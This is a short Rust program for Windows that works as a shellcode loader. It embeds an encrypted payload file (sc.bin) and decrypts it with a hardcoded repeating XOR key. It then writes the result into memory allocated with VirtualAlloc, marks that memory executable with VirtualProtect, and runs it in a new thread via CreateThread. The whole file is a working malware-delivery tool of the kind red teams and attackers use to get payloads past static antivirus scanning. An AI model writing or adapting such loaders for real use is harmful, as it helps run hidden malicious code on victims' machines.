use windows::Win32::System::{Memory::{MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READ, VirtualAlloc, PAGE_READWRITE, VirtualProtect, PAGE_PROTECTION_FLAGS}, Threading::{WaitForSingleObject, CreateThread, THREAD_CREATION_FLAGS}};
use windows::Win32::Foundation::HANDLE;
use core::ffi::c_void;
use core::ptr;
use std::ptr::null;


fn main() {

    let sc: Vec<u8> = include_bytes!("sc.bin").to_vec();
    let sc_len: usize = sc.len();

    unsafe {
        println!("[+] Allocating memory");
        let exec_mem: *mut c_void = VirtualAlloc(
            Some(ptr::null()),
            sc_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        println!("[+] Decrypting");
        let mut dec_payload: Vec<u8> = Vec::new();
        let key: Vec<u8> = vec![0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6b, 0x65, 0x79];
        let mut j: usize = 0;
        for i in 0..sc_len {
            if j > key.len() - 1 {
                j = 0;
            }
            dec_payload.push(sc[i] ^ key[j]);
            j = j + 1;
        }

        println!("[+] Copying {sc_len} bytes into memory");
        std::ptr::copy(dec_payload.as_mut_ptr(), exec_mem as *mut u8, sc_len);

        println!("[+] Making mem executable");
        let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
        VirtualProtect(
            exec_mem,
            sc_len,
            PAGE_EXECUTE_READ,
            &mut old_protect
        ).unwrap();

        let e_mem: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(exec_mem) };

        println!("[+] Creating thread");
        let h_thread: HANDLE = CreateThread(
            Some(ptr::null_mut()),
            0,
            Some(e_mem),
            Some(null()),
            THREAD_CREATION_FLAGS::default(),
            Some(ptr::null_mut())
        ).unwrap();

        println!("[+] Executing thread");
        WaitForSingleObject(h_thread, u32::MAX);
    }

}